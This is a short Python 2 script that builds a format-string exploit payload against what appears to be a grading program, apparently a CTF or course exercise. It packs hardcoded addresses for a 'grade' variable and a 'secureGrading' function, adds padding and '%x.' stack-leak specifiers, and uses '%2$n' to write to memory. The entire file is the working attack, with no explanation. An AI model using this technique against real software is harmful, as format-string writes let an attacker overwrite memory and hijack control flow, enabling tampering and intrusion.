import struct
secureGradingAddress = struct.pack("I", 0x0804849b)
gradeAddress = struct.pack("I", 0x0804a02c) #\x2c\xa0\x04\x08
exploit = "AAAA"
exploit += gradeAddress
exploit += "BBB"
exploit += "%x."*10
exploit += "%2$n"
print exploit+"AAAAAAA"+secureGradingAddress
